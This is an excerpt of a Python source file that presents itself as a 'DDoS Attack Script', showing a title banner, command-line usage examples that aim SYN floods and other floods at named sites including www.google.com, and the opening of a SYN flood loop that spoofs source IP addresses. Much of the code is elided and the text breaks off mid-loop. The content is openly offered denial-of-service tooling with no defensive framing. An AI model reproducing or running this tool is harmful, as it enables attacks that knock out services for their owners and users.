...
title = '''
 DDoS Attack Script   
 Author: cerberus                                               
 Github: http://github.com/X-The-Mystic/DDoS-8                             
 Version:'''+version+''' 
'''
...
def main():
  parser = ArgumentParser(
        ...
        epilog='''
Example:
    ./%(main.py) -d www.example.com -p 80 -T 2000 -Pyslow
    ./%(main.py) -d www.domain.com -s 100 -Request
    ./%(main.py) -d www.google.com -Synflood -T 5000 -t 10.0
'''
)
  ...
  if args.Synflood:
    ...
    while 1:
      if args.i is False:
        args.fakeip = True
        if args.fakeip is True:
          ip = fake_ip()
      else:
        ip = args.i
      try:
        for _x in range(0,int(args.T)):
